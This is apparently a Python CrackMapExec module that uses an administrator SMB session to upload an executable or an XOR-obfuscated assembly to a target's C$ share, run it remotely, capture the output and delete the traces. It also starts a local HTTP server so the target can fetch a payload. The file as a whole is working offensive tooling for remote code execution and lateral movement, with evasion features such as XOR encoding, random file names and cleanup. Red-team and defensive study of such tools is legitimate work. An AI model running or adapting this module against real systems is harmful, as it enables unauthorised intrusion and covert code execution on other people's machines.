import base64
import sys
import os
import random
import string
import tempfile
import subprocess
from impacket.smbconnection import SMBConnection
from itertools import cycle


def xor_encrypt(data, key):
    return bytearray(a ^ b for a, b in zip(data, cycle(key)))


class CMEModule:
    '''
        EXECUTE A REMOTE ASSEMBLY OR UPLOAD AN ENCRYPTED ASSEMBLY TO DISK WHICH IS THEN DECRYPTED AND EXECUTED USING A MODIFIED VERSION OF https://gist.github.com/susMdT/360c64c842583f8732cc1c98a60bfd9e
        
        MODULE BY BRANDON FISHER @shad0wcntr0ller
    '''
    name = 'assembly'
    description = "EXECUTE A REMOTE ASSEMBLY OR UPLOAD AN ENCRYPTED ASSEMBLY TO DISK WHICH IS THEN DECRYPTED AND EXECUTED USING A MODIFIED VERSION OF https://gist.github.com/susMdT/360c64c842583f8732cc1c98a60bfd9e"
    supported_protocols = ['smb']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        
        '''
        
        ASSEMBLY_ARGS -> Arguments to be passed to the modifed version of https://gist.github.com/susMdT/360c64c842583f8732cc1c98a60bfd9e   which is the assembly_embedded64
        
	UPLOAD_ASSEMBLY -> Uploads an assembly from your localhost to the target machine

        XOR_KEY -> set a custom xor key to be applied to the assembly being uploaded, if not specified, xor_key 0x55 is applied
        
        '''
        
        
        if 'assembly_args' in module_options.keys():
            self.assembly_args = module_options['assembly_args']
        elif 'ASSEMBLY_ARGS' in module_options.keys():
            self.assembly_args = module_options['ASSEMBLY_ARGS']
        else:
            self.assembly_args = ''
            context.log.info(f'No assembly_args provided. Set self.assembly_args: {self.assembly_args}')

        if 'xor_key' in module_options.keys():
            self.xor_key = bytes(module_options['xor_key'], 'utf-8')
        elif 'XOR_KEY' in module_options.keys():
            self.xor_key = bytes(module_options['XOR_KEY'], 'utf-8')
        else:
            self.xor_key = b'\x55'  # Default value

        self.tmp_dir = module_options.get('tmp_dir', "C:\\windows\\temp\\")
        self.share = "C$"
        self.tmp_share = self.tmp_dir.split(":")[1]
        self.assembly_embedded64 = base64.b64decode("")
        self.assembly_name = module_options.get('assembly_name', ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8)) + ".exe")
        self.assembly_path = module_options.get('assembly_path', '')
        self.use_embedded = True

        if 'assembly_path' in module_options:
            self.assembly_path = module_options['assembly_path']
            self.use_embedded = False
        else:
            if sys.platform == "win32":
                appdata_path = os.getenv('APPDATA')
                if not os.path.exists(appdata_path + "\CME"):
                    os.mkdir(appdata_path + "\CME")
                self.assembly_path = appdata_path + "\CME\\"
            else:
                if not os.path.exists("/tmp/cme/"):
                    os.mkdir("/tmp/cme/")
                self.assembly_path = "/tmp/cme/"

        if 'assembly_name' in module_options:
            self.assembly_name = module_options['assembly_name']
            self.use_embedded = False

        if 'tmp_dir' in module_options:
            self.tmp_dir = module_options['tmp_dir']

        if 'UPLOAD_ASSEMBLY' in module_options:
            self.upload_assembly = module_options['UPLOAD_ASSEMBLY']
        else:
            self.upload_assembly = ''

        self.web_server_process = None

    
    @staticmethod
    def random_filename(length=10):
        return ''.join(random.choice(string.ascii_lowercase) for i in range(length))

    def on_admin_login(self, context, connection):
        xor_key_used = False
        if self.upload_assembly:
            xor_key_used = True
            try:
                upload_assembly_dir = os.path.dirname(self.upload_assembly)
                with open(self.upload_assembly, 'rb') as assembly_file:
                    encrypted_assembly = xor_encrypt(assembly_file.read(), self.xor_key)
                    random_local_name = self.random_filename() + '.Enc'
                    encrypted_assembly_path = os.path.join(upload_assembly_dir, random_local_name)
                    with open(encrypted_assembly_path, 'wb') as enc_assembly_file:
                        enc_assembly_file.write(encrypted_assembly)
                        context.log.success(f'Local file {encrypted_assembly_path} created with key {self.xor_key.hex()}')
                    random_remote_name = random_local_name
                    remote_temp_path = f'{self.tmp_dir}{random_remote_name}'
                    with open(encrypted_assembly_path, 'rb') as enc_assembly_file:
                        connection.conn.putFile(self.share, self.tmp_share + random_remote_name, enc_assembly_file.read)
                    context.log.success(f'Uploaded file {random_remote_name} to \\{self.share}{self.tmp_share}')
                    os.remove(encrypted_assembly_path)
                    context.log.info(f'Local file {encrypted_assembly_path} removed')
            except Exception as e:
                context.log.error('Error writing file to share {}: {}'.format(self.share, e))
        else:
            self.web_server_process = subprocess.Popen(['python3', '-m', 'http.server', '80'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
            context.log.highlight("Started Python HTTP server in the current directory")

        if self.use_embedded:
            with open(self.assembly_path + self.assembly_name, 'wb') as assembly_file:
                assembly_file.write(self.assembly_embedded64)

        context.log.info('Copy {} to {}'.format(self.assembly_path + self.assembly_name, self.tmp_dir))
        with open(self.assembly_path + self.assembly_name, 'rb') as assembly_file:
            remote_temp_path = f'{self.tmp_dir}{self.assembly_name}'
            try:
                connection.conn.putFile(self.share, self.tmp_share + self.assembly_name, assembly_file.read)
                context.log.success('Created file {} on the \\\\{}{}'.format(self.assembly_name, self.share, self.tmp_share))
                os.remove(self.assembly_path + self.assembly_name)
            except Exception as e:
                context.log.error('Error writing file to share {}: {}'.format(self.share, e))

        xor_key_string = self.xor_key.decode('utf-8')
        uploaded_enc_file = f'{self.tmp_dir}{random_remote_name}' if self.upload_assembly else ''

        if xor_key_used and self.upload_assembly:
            exec_command = f'{remote_temp_path} {xor_key_string} {uploaded_enc_file} {self.assembly_args}'
        elif xor_key_used:
            exec_command = f'{remote_temp_path} {xor_key_string} {self.assembly_args}'
        else:
            exec_command = f'{remote_temp_path} {self.assembly_args}'

        context.log.info(f'Executing Assembly with command: {exec_command}')
        output = connection.execute(exec_command, True)

        if output:
            context.log.highlight(f'Script executed successfully, output: {output}')
        else:
            context.log.error('No output from the executed command')

        try:
            if self.upload_assembly:
                connection.conn.deleteFile(self.share, self.tmp_share + random_remote_name)
            connection.conn.deleteFile(self.share, self.tmp_share + self.assembly_name)
        except Exception as e:
            context.log.error('Error deleting file from share {}: {}'.format(self.share, e))

        if self.web_server_process:
            self.web_server_process.terminate()
            #context.log.highlight("Stopped Python HTTP server")
